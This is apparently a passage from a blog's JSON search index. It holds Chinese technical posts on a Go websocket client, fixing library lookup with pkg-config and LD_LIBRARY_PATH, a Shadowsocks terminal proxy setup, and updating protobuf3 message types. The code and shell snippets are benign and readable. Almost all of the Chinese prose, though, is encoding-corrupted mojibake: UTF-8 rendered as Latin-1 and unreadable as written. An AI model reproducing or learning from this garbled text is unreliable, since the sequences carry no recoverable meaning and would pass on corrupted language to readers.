clientç«¯\n\nclientå¯åŠ¨åï¼Œé¦–å…ˆè¿æ¥serverã€‚è¿æ¥å»ºç«‹åï¼Œä¸»routineæ¯ä¸€ç§’é’Ÿå‘serverå‘é€æ¶ˆæ¯(å½“å‰æ—¶é—´)ã€‚å¦ä¸€ä¸ªroutineä»serveræ¥æ”¶æ•°æ®,å¹¶æ‰“å°ã€‚\n\nå½“clienté€€å‡ºæ—¶ï¼Œä¼šå‘serverå‘é€å…³é—­æ¶ˆæ¯ã€‚æ¥ç€ï¼Œç­‰å¾…é€€å‡ºã€‚\n\n```go\npackage main\n\nimport (\n\t\"flag\"\n\t\"log\"\n\t\"net/url\"\n\t\"os\"\n\t\"os/signal\"\n\t\"time\"\n\n\t\"github.com/gorilla/websocket\"\n)\n\nvar addr = flag.String(\"addr\", \"localhost:8080\", \"http service address\")\n\nfunc main() {\n\tflag.Parse()\n\tlog.SetFlags(0)\n\n\tinterrupt := make(chan os.Signal, 1)\n\tsignal.Notify(interrupt, os.Interrupt)\n\n\tu := url.URL{Scheme: \"ws\", Host: *addr, Path: \"/echo\"}\n\tlog.Printf(\"connecting to %s\", u.String())\n\n\tc, _, err := websocket.DefaultDialer.Dial(u.String(), nil)\n\tif err != nil {\n\t\tlog.Fatal(\"dial:\", err)\n\t}\n\tdefer c.Close()\n\n\tdone := make(chan struct{})\n\n\tgo func() {\n\t\tdefer close(done)\n\t\tfor {\n\t\t\t_, message, err := c.ReadMessage()\n\t\t\tif err != nil {\n\t\t\t\tlog.Println(\"read:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tlog.Printf(\"client recv: %s\", message)\n\t\t}\n\t}()\n\n\tticker := time.NewTicker(time.Second)\n\tdefer ticker.Stop()\n\n\tfor {\n\t\tselect {\n\t\tcase <-done:\n\t\t\treturn\n\t\tcase t := <-ticker.C:\n\t\t\terr := c.WriteMessage(websocket.TextMessage, []byte(t.String()))\n\t\t\tif err != nil {\n\t\t\t\tlog.Println(\"write:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\tcase <-interrupt:\n\t\t\tlog.Println(\"interrupt\")\n\n\t\t\t// Cleanly close the connection by sending a close message and then\n\t\t\t// waiting (with timeout) for the server to close the connection.\n\t\t\terr := c.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, \"\"))\n\t\t\tif err != nil {\n\t\t\t\tlog.Println(\"write close:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tselect {\n\t\t\tcase <-done:\n\t\t\tcase <-time.After(time.Second):\n\t\t\t}\n\t\t\treturn\n\t\t}\n\t}\n}\n```\n\n\n\n![1](golangçš„websocketå®æˆ˜/1.png)\n\n\n\n### 3. æ€»ç»“\n\n##### æœåŠ¡å™¨:\n\n+ var upgrader = websocket.Upgrader{}\n+ c, err := upgrader.Upgrade(w, r, nil)\n+ forå¾ªç¯é‡Œ c.ReadMessage()  å’Œ c.WriteMessage(mt, message)\n\n##### å®¢æˆ·ç«¯:\n\n+ c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)\n+ forå¾ªç¯é‡Œ c.ReadMessage()  å’Œ c.WriteMessage(mt, message)\n\n\n\n### 4. å‚è€ƒèµ„æ–™\n\n+ https://zhuanlan.zhihu.com/p/35167916\n+ https://www.jianshu.com/p/3fc3646fad80","tags":["websocket"],"categories":["4_golangå®æˆ˜"]},{"title":"åŠ¨æ€åº“æŸ¥æ‰¾è·¯å¾„åŠLD_LIBRARY_PATHé—®é¢˜","url":"%2Fp%2F17c0913d.html","content":"\nè¯´åˆ°å’ŒåŠ¨æ€åº“æŸ¥æ‰¾è·¯å¾„ç›¸å…³çš„é—®é¢˜ï¼Œæ€»ä½“ä¸Šå¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼š\n\n+ ç¬¬ä¸€ç±»ï¼šé€šè¿‡æºä»£ç ç¼–è¯‘ç¨‹åºæ—¶å‡ºç°çš„æ‰¾ä¸åˆ°æŸä¸ªä¾èµ–åŒ…çš„é—®é¢˜\n+ ç¬¬äºŒç±»ï¼šå°±æ˜¯åœ¨è¿è¡Œç¨‹åºçš„æ—¶å€™ï¼Œæ˜æ˜æŠŠé‚£ä¸ªç¨‹åºéœ€è¦çš„ä¾èµ–åŒ…éƒ½å·²ç»å®‰è£…çš„å¦¥å¦¥çš„äº†ï¼Œå¯è¿è¡Œçš„æ—¶å€™äººå®¶å°±å‘Šè¯‰ä½ è¯´`error while loading shared libraries: libxxx.so.y: cannot open shared object file: No such file or directory`ã€‚\n\n<!-- more -->\n\n###    1. æºä»£ç å®‰è£…ç¨‹åºæ‰¾ä¸åˆ°ä¾èµ–åº“\n\né€šè¿‡æºç åŒ…å®‰è£…ç¨‹åºæ—¶ï¼Œä¸»è¦ç”¨åˆ°äº†â€œä¸‰å¤§æ­¥â€ç­–ç•¥ï¼šconfigureã€makeå’Œmake install ã€‚å‡ºé—®é¢˜æœ€å¤šçš„å°±æ˜¯åœ¨configureé˜¶æ®µï¼Œå¾ˆå¤šåˆå­¦è€…ç”±äºä¸çŸ¥é“configureçš„é‚£ä¹ˆå¤šå‚æ•°è¯¥æ€ä¹ˆç”¨ï¼Œæ‰€ä»¥å¾€å¾€ä¸ºäº†çœäº‹ï¼Œä¸€å¥ç®€å•çš„â€œ./configureâ€ä¸‹å»ï¼Œç™¾åˆ†ä¹‹å…«ä¹åéƒ½èƒ½æˆåŠŸï¼Œå¯é—®é¢˜å¾€å¾€å°±å‡ºåœ¨å‰©ä¸‹çš„ç™¾åˆ†ä¹‹åå‡ ä¸Šé¢äº†ã€‚\n\n\n\nåœ¨å®‰è£…çš„configureé˜¶æ®µï¼Œä¸ºäº†æ£€æµ‹å®‰è£…å®‰è£…ç¯å¢ƒæ˜¯å¦æ»¡è¶³ï¼Œé€šå¸¸æƒ…å†µä¸‹éƒ½æ˜¯é€šè¿‡ä¸€ä¸ªå«åš`pkg-config`çš„å·¥å…·æ¥æ£€æµ‹å®ƒéœ€è¦ä¾èµ–çš„åŠ¨æ€åº“æ˜¯å¦å­˜åœ¨ï¼Œè¿™ä¸ªå·¥å…·æˆ‘ä»¬åœ¨ä¸Šä¸€ç¯‡åšæ–‡å·²ç»è®¤è¯†è¿‡äº†ã€‚pkg-configé€šå¸¸æƒ…å†µéƒ½æ˜¯ä½äº/usr/binç›®å½•ä¸‹ï¼Œæ˜¯ä¸ªå¯æ‰§è¡Œç¨‹åºã€‚åœ¨configureé˜¶æ®µï¼Œé€šå¸¸éƒ½ä¼šç”¨pkg-configæ¥åˆ¤æ–­æ‰€ä¾èµ–çš„åŠ¨æ€åº“æ˜¯å¦å­˜åœ¨ã€‚ç°åœ¨é—®é¢˜å°±æ˜¯ï¼Œè¿™ä¸ªå·¥å…·æ˜¯å¦‚ä½•åˆ¤æ–­çš„å‘¢ï¼Ÿå®ƒçš„ä¾æ®æ˜¯ä»€ä¹ˆï¼Ÿå½“è¿™ä¸¤ä¸ªé—®é¢˜å¼„æ˜ç™½äº†ï¼ŒçœŸç›¸ä¹Ÿå°±å¤§ç™½äº†ã€‚\n\n\n\n ä¸€èˆ¬å½“æˆ‘ä»¬å®‰è£…å®ŒæŸä¸ªç¨‹åºåï¼Œå¦‚æœå®ƒæä¾›äº†åŠ¨æ€åº“çš„åŠŸèƒ½ï¼Œåœ¨æºç ä¸­éƒ½ä¼šæœ‰ä¸€ä¸ªæˆ–å¤šä¸ªä»¥pcç»“å°¾çš„æ–‡ä»¶ï¼Œå½“æ‰§è¡Œå®Œmake installåè¿™äº›pcæ–‡ä»¶æ‹·è´åˆ°${prefix}/lib/pkgconfigè¿™ä¸ªç›®å½•é‡Œï¼Œè¿™é‡Œçš„prefixå°±æ˜¯æˆ‘ä»¬åœ¨configureé˜¶æ®µæ—¶é€šè¿‡é…ç½®å‚æ•°--prefixæŒ‡å®šçš„ï¼Œç¼ºçœæƒ…å†µè¿™ä¸ªå€¼å°±æ˜¯/usr/localï¼Œæ‰€ä»¥è¿™äº›pcæ–‡ä»¶æœ€ç»ˆä¼šè¢«æ‹·è´åˆ°/usr/local/lib/pkgconfigç›®å½•ä¸‹ã€‚å¯èƒ½æœ‰äººä¼šé—®ï¼Œè¿™äº›pcæ–‡ä»¶æœ‰å•¥ç”¨å‘¢ï¼Ÿæˆ‘ä»¬éšä¾¿æ‰“å¼€ä¸€ä¸ªæ¥ç…ç…ï¼š\n\n```shell\n\n[root@localhost ~]# cat /usr/local/lib/pkgconfig/librtmp.pc\nprefix=/usr/local\nexec_prefix=${prefix}\nlibdir=${exec_prefix}/lib\nincdir=${prefix}/include\n\n\nName: librtmp\nDescription: RTMP implementation\nVersion: v2.3\nRequires: libssl,libcrypto\nURL: http://rtmpdump.mplayerhq.hu\nLibs: -L${libdir} -lrtmp -lz\nCflags: -I${incdir}\n```\n\nè·Ÿæˆ‘ä»¬configureé˜¶æ®µç›¸å…³çš„ä¸»è¦é›†ä¸­åœ¨Libså’ŒCflagsä¸¤é¡¹ä¸Šé¢ï¼Œå¦‚æœä½ æ­¤æ—¶å†æ‰§è¡Œä¸‹é¢è¿™ä¸¤æ¡å‘½ä»¤ï¼Œå°±å…¨æ˜ç™½äº†ï¼š\n\n```shell\n[root@localhost ~]# pkg-config --cflags librtmp\n-I/usr/local/include\n[root@localhost ~]# pkg-config --libs librtmp\n-L/usr/local/lib -lrtmp -lz -lssl -lcrypto\n```\n\nä¹Ÿå°±æ˜¯è¯´ï¼Œpkg-configæŠŠæˆ‘ä»¬ä»¥å‰éœ€è¦åœ¨Makefileé‡ŒæŒ‡å®šç¼–è¯‘å’Œé“¾æ¥æ—¶æ‰€éœ€è¦ç”¨åˆ°çš„å‚æ•°ä»æ‰‹å·¥ç¡¬ç¼–ç çš„æ¨¡å¼å˜æˆäº†è‡ªåŠ¨å®Œæˆï¼ŒèŠ‚çº¦äº†å¤šå°‘è·¨å¹³å°ç§»æ¤çš„å…¼å®¹æ€§é—®é¢˜ã€‚\n\n\n\n##### 1.1 å®‰è£…äº†æ‰¾ä¸åˆ°ä¾èµ–åº“çš„åŸå› \n\nå‡å¦‚è¯´ï¼Œå¦‚æœæˆ‘ä»¬å°†è¦çš„ç¼–è¯‘çš„è½¯ä»¶åŒ…ä¾èµ–librtmpè¿™ä¸ªåŠ¨æ€åº“ï¼Œé‚£ä¹ˆæ­¤æ—¶åœ¨æˆ‘ç³»ç»Ÿä¸Šè¿™ä¸ªæ£€æµ‹å°±ç®—é€šè¿‡äº†ã€‚å½“ç„¶è¿™åªæ˜¯ç¬¬ä¸€æ­¥ï¼Œæ£€æµ‹è¿‡äº†ä¸ä¸€å®šå…¼å®¹ï¼Œè¿™é‡Œæˆ‘ä»¬åªè®¨è®ºèƒ½ä¸èƒ½æ‰¾åˆ°ä¾èµ–åº“çš„é—®é¢˜ã€‚å¥½äº†ï¼Œå¦‚æœè¯´æ‰¾ä¸åˆ°æŸä¸ªåº“è¯¥æ€ä¹ˆåŠã€‚å‰ææ˜¯ä½ ç¡®ç¡®å®å®å·²ç»å®‰è£…äº†å®ƒéœ€è¦çš„åº“ï¼Œä¸ç”¨å¤šæƒ³ï¼ŒåŸå› åªæœ‰ä¸€ä¸ªï¼Œpkg-configæ‰¾ä¸åˆ°è¿™ä¸ªä¸è¿™ä¸ªåº“å¯¹åº”çš„pcæ–‡ä»¶ã€‚\n\nä¸ºä»€ä¹ˆä¼šæ‰¾ä¸åˆ°å‘¢ï¼ŒåŸå› åˆæœ‰ä¸¤ç‚¹ï¼š\n\n1ã€pkg-configæœç´¢äº†æ‰€æœ‰å®ƒè®¤ä¸ºåˆé€‚çš„ç›®å½•éƒ½æ²¡æ‰¾ç€è¿™ä¸ªåº“å¯¹åº”çš„pcæ–‡ä»¶çš„ä¸‹è½ï¼›\n\n2ã€è¿™ä¸ªåº“åœ¨å‘å¸ƒæ—¶æ ¹æœ¬å°±æ²¡æœ‰æä¾›å®ƒçš„pcæ–‡ä»¶ã€‚\n\n> é‚£ä¹ˆpkg-configçš„æŸ¥æ‰¾è·¯å¾„æ˜¯å“ªé‡Œï¼Ÿ\n\npkg-configè¾ƒè€çš„ç‰ˆæœ¬é‡Œï¼Œç¼ºçœæƒ…å†µä¸‹ä¼šåˆ°/usr/lib/pkgconfigã€/usr/loca/lib/pkgconfigã€/usr/share/pkgconfigç­‰ç›®å½•ä¸‹å»æœç´¢pcæ–‡ä»¶ï¼Œæ®æˆ‘æ‰€çŸ¥åœ¨0.23ä»¥åŠä¹‹åçš„ç‰ˆæœ¬é‡Œpkg-configçš„æºç é‡Œå·²ç»æ²¡æœ‰å…³äºç¼ºçœæœç´¢è·¯å¾„çš„ä»»ä½•ç¡¬ç¼–ç çš„æˆåˆ†äº†ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ï¼Œå½“ä½ çœ‹pkg-configçš„manæ‰‹å†Œæ—¶ä¼šæœ‰ä¸‹é¢ä¸€æ®µè¯ï¼š\n\n```\npkg-config retrieves information about packages from special metadata files. These files are  named  after the  package,  with  the extension .pc.\nBy default, pkg-config looks in the directory ___prefix___/lib/pkgconfig for these files; it will also look in the colon-separated (on Windows, semicolon-separated) list of directories specified by the PKG_CONFIG_PATH environment variable.\n\n\n\nPKG_CONFIG_PATH\n    A colon-separated (on Windows, semicolon-separated) list of directories to search  for  .pc  files. The  default directory will always be searched after searching the path; the default is ___libdir___/pkg-config:___datadir___/pkgconfig where libdir is the libdir where pkg-config and  datadir  is  the  datadir where pkg-config was installed.\n```\n\n\n\n  ä¸Šé¢çš„prefixã€libdirå’Œdatadirï¼Œå°±æ˜¯å®‰è£…pkg-configæ—¶è¢«è®¾å®šå¥½çš„ï¼Œå…·ä½“æƒ…å†µæ˜¯ï¼š\n\n+ å¦‚æœä½ æ˜¯é€šè¿‡yumå’ŒrpmåŒ…å®‰è£…çš„\n\n  ```bash\n  prefix=/usr\n  libdir=${prefix}/lib=/usr/lib\n  datadir=${prefix}/share=/usr/share\n  ```\n\n+ å¦‚æœä½ æ˜¯é€šè¿‡æºç åŒ…å®‰è£…çš„ï¼Œä¸”æ²¡æœ‰æŒ‡å®šprefixçš„å€¼\n\n  ```bash\n  prefix=/usr/local\n  libdir=${prefix}/lib=/usr/local/lib\n  datadir=${prefix}/share=/usr/local/share \n  ```\n\n\n\npkg-configåœ¨æŸ¥æ‰¾å¯¹åº”è½¯ä»¶åŒ…çš„ä¿¡æ¯æ—¶çš„ç¼ºçœæœç´¢è·¯å¾„å·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œå°±æ˜¯æ˜¯`${libdir}/pkgconfig`å’Œ`${datadir}/pkgconfig`ã€‚å¦‚æœä½ è½¯ä»¶åŒ…å¯¹åº”çš„pcæ–‡ä»¶éƒ½ä¸åœ¨è¿™ä¸¤ä¸ªç›®å½•ä¸‹æ—¶ï¼Œpkg-configè‚¯å®šæ‰¾ä¸åˆ°ã€‚æ—¢ç„¶åŸå› éƒ½å·²ç»æ‰¾åˆ°äº†ï¼Œé‚£è§£å†³åŠæ³•ä¹Ÿå°±å¤šç§å¤šæ ·äº†ã€‚\n\n\n\n##### 1.2 è§£å†³æ‰¾ä¸åˆ°åº“çš„é—®é¢˜(PKG_CONFIG_PATH)\n\n+ æˆ‘ä»¬å¯ä»¥åœ¨å®‰è£…æˆ‘ä»¬é‚£ä¸ªè¢«ä¾èµ–çš„è½¯ä»¶åŒ…æ—¶ï¼Œåœ¨configureé˜¶æ®µç”¨--prefixå‚æ•°æŠŠå®‰è£…ç›®å½•æŒ‡å®šåˆ°/usrç›®å½•ä¸‹ï¼›\n\n+ ä¹Ÿå¯ä»¥æŒ‰ç…§ä¸Šé¢è¯´çš„ï¼Œé€šè¿‡ä¸€ä¸ªåå«`PKG_CONFIG_PATH`çš„ç¯å¢ƒå˜é‡æ¥å‘pkg-configæŒ‡æ˜æˆ‘ä»¬è‡ªå·±çš„pcæ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„ï¼Œä¸è¿‡è¦æ³¨æ„çš„æ˜¯`PKG_CONFIG_PATH`æ‰€æŒ‡å®šçš„è·¯å¾„ä¼˜å…ˆçº§æ¯”è¾ƒé«˜ï¼Œpkg-configä¼šå…ˆè¿›è¡Œæœç´¢ï¼Œå®Œäº†ä¹‹åæ‰æ˜¯å»æœç´¢ç¼ºçœè·¯å¾„ã€‚\n\nå‰è€…çš„ä¼˜ç‚¹æ˜¯ä»¥åå†é€šè¿‡æºç å®‰è£…è½¯ä»¶æ—¶å°‘äº†ä¸å°‘éº»çƒ¦ï¼Œç¼ºç‚¹æ˜¯ç”¨æˆ·è‡ªå·±çš„è½¯ä»¶åŒ…å’Œç³»ç»Ÿè½¯ä»¶æ··åˆ°ä¸€èµ·ä¸æ–¹ä¾¿ç®¡ç†ï¼Œæ‰€ä»¥å®é™…ä½¿ç”¨ä¸­ï¼Œåè€…ç”¨çš„è¦å¤šä¸€äº›ã€‚å¦‚ä¸‹:\n\n```bash\nexport PKG_CONFIG_PATH=/your/local/path:$PKG_CONFIG_PATH\n```\n\n  ç„¶åï¼Œåœ¨configureæ—¶å°±ç»å¯¹æ²¡é—®é¢˜äº†ã€‚\n\n\n\n### 2. ç¨‹åºè¿è¡Œæ—¶å‡ºç°libxxx.so.y => not found\n\n##### 2.1 ldd æŸ¥çœ‹ä¾èµ–çš„åŠ¨æ€åº“\n\nç”¨`ldd å¯æ‰§è¡Œç¨‹åºå`å¯ä»¥æŸ¥çœ‹ä¸€ä¸ªè½¯ä»¶å¯åŠ¨æ—¶æ‰€ä¾èµ–çš„åŠ¨æ€åº“ï¼Œå¦‚æœè¾“å‡ºé¡¹æœ‰â€œlibxxx.so.y=> not foundâ€ä¸€é¡¹ï¼Œä½ è¿™ä¸ªè½¯ä»¶100%è¿è¡Œä¸èµ·æ¥ã€‚æˆ‘ä»¬æ¥åšä¸ªè¯•éªŒï¼š\n\n```bash\n[root@localhost ~]# echo $LD_LIBRARY_PATH    //å˜›ä¹Ÿæ²¡æœ‰\n[root@localhost ~]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => /usr/local/lib/libmp3lame.so.0 (0x0088c000)\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x00573000)\n........\n```\n\n\n\næˆ‘çš„ç³»ç»Ÿé‡Œæ²¡æœ‰è®¾ç½®`LD_LIBRARY_PATH`ç¯å¢ƒå˜é‡ï¼Œç°åœ¨æˆ‘ä»¬æŠŠå…¶ä¸­çš„ä¸€ä¸ªåº“`libmp3lame.so.0`ä»`/usr/loca/lib`ä¸‹ç§»åŠ¨åˆ°/optç›®å½•é‡Œï¼Œå¹¶æ‰§è¡Œldconfigï¼Œè®©`libmp3lame.so.0`å½»åº•ä»`/etc/ld.so.cache`é‡Œé¢æ¶ˆå¤±ã€‚å…¶å®`libmp3lame.so.0`åªæ˜¯`libmp3lame.so.0.0.0`çš„ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œæˆ‘ä»¬çœŸæ­£éœ€è¦ç§»åŠ¨çš„æ˜¯åè€….\n\nå®Œäº†ä¹‹åå†æ‰§è¡Œldd /usr/local/bin/ffmpegæ—¶ç»“æœå¦‚ä¸‹ï¼š\n\n```bash\n[root@localhost ~]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => not found    //æœç„¶Not found äº†\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x004a4000)\n........\n\n[root@localhost ~]# ffmpeg --help\nffmpeg: error while loading shared libraries: libmp3lame.so.0: cannot open shared object file: No such file or directory  //æ­¤æ—¶ffmpegå½“ç„¶è¿è¡Œä¸èµ·æ¥\n```\n\n   \n\n##### 2.2 LD_LIBRARY_PATH \n\næˆ‘ä»¬æ¥è¯•è¯•LD_LIBRARY_PATHï¼Œçœ‹çœ‹å¥½ä½¿ä¸ï¼š\n\n```bash\n[root@localhost opt]# export LD_LIBRARY_PATH=/opt:$LD_LIBRARY_PATH\n[root@localhost opt]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => not found           //çº³å°¼ï¼Ÿï¼Ÿï¼ï¼ï¼\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x00124000)\n........\n```\n\nè¿˜è®°å¾—ä¸Šé¢æåˆ°äº†è½¯é“¾æ¥ä¹ˆï¼Œ`libmp3lame.so.0`å°±æ˜¯`libmp3lame.so.0.0.0`çš„è½¯é“¾æ¥ï¼Œè¿™æ˜¯åŠ¨æ€åº“çš„å‘½åè§„èŒƒçš„ä¸€ç§å…¬çº¦ï¼Œæˆ‘ä»¬åªè¦åœ¨/opt/ç›®å½•ä¸‹å»ºç«‹ä¸€ä¸ªåä¸º`libmp3lame.so.0`çš„åˆ°`/opt/libmp3lame.so.0.0.0`çš„è½¯é“¾æ¥å°±OKäº†ï¼š\n\n```bash\n[root@localhost opt]# ln -s libmp3lame.so.0.0.0 libmp3lame.so.0\n[root@localhost opt]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => /opt/libmp3lame.so.0 (0x00767000)   //ç»ˆäºåœ†æ»¡äº†:)\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x006e8000)\n........\n```\n\n### 3. æ€»ç»“\n\né’ˆå¯¹åŠ¨æ€åº“è·¯å¾„æŸ¥æ‰¾çš„ç§ç§é—®é¢˜ï¼Œæ— éå°±è¿™ä¹ˆä¸¤å¤§ç±»ï¼Œå…³é”®æ˜¯æ‰¾å¯¹åŸå› ï¼Œå¯¹ç—‡ä¸‹è¯ï¼Œæ–¹èƒ½è¯åˆ°ç—…é™¤ã€‚\n\n+ PKG_CONFIG_PATHä»å­—é¢æ„æ€ä¸Šç¿»è¯‘ï¼Œå°±æ˜¯â€œè½¯ä»¶åŒ…çš„é…ç½®è·¯å¾„â€ï¼Œè¿™ä¸å¾ˆæ˜æ˜¾äº†ä¹ˆï¼Œç¼–è¯‘è½¯ä»¶æ—¶å¦‚æœå‡ºç°æ‰¾ä¸åˆ°æ‰€ä¾èµ–çš„åŠ¨æ€åº“æ—¶éƒ½å…¨é PKG_CONFIG_PATHäº†ï¼›\n+ LD_LIBRARY_PATHä¹Ÿå¾ˆç›´ç™½äº†â€œè£…è½½å™¨çš„åº“è·¯å¾„â€ï¼ŒLDæ˜¯Loaderçš„ç®€å†™ï¼Œåœ¨Linuxç³»ç»Ÿå¯åŠ¨ä¸€ä¸ªç¨‹åºçš„è¿‡ç¨‹å°±å«åšè£…è½½ï¼Œä¸€ä¸ªç¨‹åºè¦æ‰§è¡Œæ—¶å®ƒæˆ–å¤šæˆ–å°‘çš„ä¼šä¾èµ–ä¸€äº›åŠ¨æ€åº“(é™æ€ç¼–è¯‘çš„é™¤å¤–)ã€‚\n\n### 4. å‚è€ƒèµ„æ–™\n\n+ http://blog.chinaunix.net/uid-23069658-id-4028681.html\n+ https://prefetch.net/articles/linkers.badldlibrary.html","tags":["linux"],"categories":["ç³»ç»Ÿ"]},{"title":"ä¸ºiterm2è®¾ç½®shadowsocksä»£ç†","url":"%2Fp%2F937317d6.html","content":"\nshadowsocksæ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ä»£ç†å·¥å…·ï¼Œå®ƒä½¿ç”¨socks5åè®®ï¼Œè€Œç»ˆç«¯å¾ˆå¤šå·¥å…·ç›®å‰åªæ”¯æŒhttpå’Œhttpsç­‰åè®®ï¼Œå¯¹socks5åè®®æ”¯æŒä¸å¤Ÿå¥½ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ºç»ˆç«¯è®¾ç½®shadowsocksçš„æ€è·¯å°±æ˜¯å°†socksåè®®è½¬æ¢æˆhttpåè®®ï¼Œç„¶åä¸ºç»ˆç«¯è®¾ç½®å³å¯ã€‚\n\n\n\n# 1. è®¾ç½®ç»ˆç«¯ä»£ç†\n\næœ€æ–°çš„ [ShadowsocksX-NG](https://github.com/shadowsocks/ShadowsocksX-NG/releases/) å·²ç»æ”¯æŒç»ˆç«¯ä»£ç†, æˆ‘ä»¬å¯ä»¥å¦‚ä¸‹å›¾å¤åˆ¶å¾—å‡º:\n```bash\nexport http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;\n```\n<!-- more -->\n\n<img src=\"ä¸ºiterm2è®¾ç½®shadowsocksä»£ç†/1.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\nä¸ºäº†æ–¹ä¾¿, æˆ‘ä»¬å¯ä»¥åˆ¶ä½œä¸€ä¸‹åˆ«å\n\n```bash\nalias setproxy='export http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;' # è®¾ç½®ç»ˆç«¯ä»£ç†\n\nalias disproxy='unset http_proxy https_proxy' # å–æ¶ˆç»ˆç«¯ä»£ç†\n\nalias ip='curl cip.cc' # æµ‹è¯•\n```\n\nå¦å¤–æˆ‘ä»¬å¯ä»¥é€šè¿‡`ShadowsocksX-NG` çš„åå¥½è®¾ç½®çœ‹åˆ°ä»¥ä¸‹ç›¸å…³é…ç½®.\n\n\n\n### 1.1 httpç›‘å¬ç«¯å£\n\n<img src=\"ä¸ºiterm2è®¾ç½®shadowsocksä»£ç†/2.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\n### 1.2 sockes5ç›‘å¬ç«¯å£\n\n<img src=\"ä¸ºiterm2è®¾ç½®shadowsocksä»£ç†/3.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\n# 2. å‚è€ƒèµ„æ–™\n\n+ https://droidyue.com/blog/2016/04/04/set-shadowsocks-proxy-for-terminal/\n+ https://blog.naaln.com/2019/03/terminal-proxy/\n","tags":["iterm2"],"categories":["ç»ˆç«¯"]},{"title":"protobuf3è¯­æ³•æŒ‡å—02","url":"%2Fp%2F2f7b392a.html","content":"\n### 7. æ›´æ–°æ¶ˆæ¯ç±»å‹\n\nå¦‚æœç°æœ‰çš„æ¶ˆæ¯ç±»å‹ä¸å†æ»¡è¶³æ‚¨çš„æ‰€æœ‰éœ€æ±‚ - ä¾‹å¦‚ï¼Œæ‚¨å¸Œæœ›æ¶ˆæ¯æ ¼å¼å…·æœ‰é¢å¤–çš„å­—æ®µ - ä½†æ‚¨ä»ç„¶å¸Œæœ›ä½¿ç”¨ä½¿ç”¨æ—§æ ¼å¼åˆ›å»ºçš„ä»£ç ï¼Œè¯·ä¸è¦æ‹…å¿ƒï¼åœ¨ä¸ç ´åä»»ä½•ç°æœ‰ä»£ç çš„æƒ…å†µä¸‹æ›´æ–°æ¶ˆæ¯ç±»å‹éå¸¸ç®€å•ã€‚è¯·è®°ä½ä»¥ä¸‹è§„åˆ™ï¼š\n\n<!-- more -->\n\n- è¯·å‹¿æ›´æ”¹ä»»ä½•ç°æœ‰å­—æ®µçš„å­—æ®µç¼–å·ã€‚\n- å¦‚æœæ·»åŠ æ–°å­—æ®µï¼Œåˆ™ä½¿ç”¨â€œæ—§â€æ¶ˆæ¯æ ¼å¼æŒ‰ä»£ç åºåˆ—åŒ–çš„ä»»ä½•æ¶ˆæ¯ä»å¯ç”±æ–°ç”Ÿæˆçš„ä»£ç è¿›è¡Œè§£æã€‚æ‚¨åº”è¯¥è®°ä½è¿™äº›å…ƒç´ çš„[é»˜è®¤å€¼](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23default)ï¼Œä»¥ä¾¿æ–°ä»£ç å¯ä»¥æ­£ç¡®åœ°ä¸æ—§ä»£ç ç”Ÿæˆçš„æ¶ˆæ¯è¿›è¡Œäº¤äº’ã€‚åŒæ ·ï¼Œæ‚¨çš„æ–°ä»£ç åˆ›å»ºçš„æ¶ˆæ¯å¯ä»¥ç”±æ—§ä»£ç è§£æï¼šæ—§çš„äºŒè¿›åˆ¶æ–‡ä»¶åœ¨è§£ææ—¶åªæ˜¯å¿½ç•¥æ–°å­—æ®µã€‚æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…â€œ [æœªçŸ¥å­—æ®µâ€](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23unknowns)éƒ¨åˆ†\n- åªè¦åœ¨æ›´æ–°çš„æ¶ˆæ¯ç±»å‹ä¸­ä¸å†ä½¿ç”¨å­—æ®µç¼–å·ï¼Œå°±å¯ä»¥åˆ é™¤å­—æ®µã€‚æ‚¨å¯èƒ½å¸Œæœ›é‡å‘½åè¯¥å­—æ®µï¼Œå¯èƒ½æ·»åŠ å‰ç¼€â€œOBSOLETE_â€ï¼Œæˆ–è€…[ä¿ç•™](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23reserved)å­—æ®µç¼–å·ï¼Œä»¥ä¾¿æ‚¨çš„æœªæ¥ç”¨æˆ·`.proto`ä¸ä¼šæ„å¤–åœ°é‡å¤ä½¿ç”¨è¯¥ç¼–å·ã€‚\n- `int32`ï¼Œ`uint32`ï¼Œ`int64`ï¼Œ`uint64`ï¼Œå’Œ`bool`éƒ½æ˜¯å…¼å®¹çš„-è¿™æ„å‘³ç€ä½ å¯ä»¥æ”¹å˜è¿™äº›ç±»å‹åˆ°å¦ä¸€ä¸ªçš„ä¸€ä¸ªåœºä¸ç ´åforwards-æˆ–å‘åå…¼å®¹ã€‚å¦‚æœä»å¯¼çº¿ä¸­è§£æå‡ºä¸€ä¸ªä¸ç¬¦åˆç›¸åº”ç±»å‹çš„æ•°å­—ï¼Œæ‚¨å°†è·å¾—ä¸åœ¨C 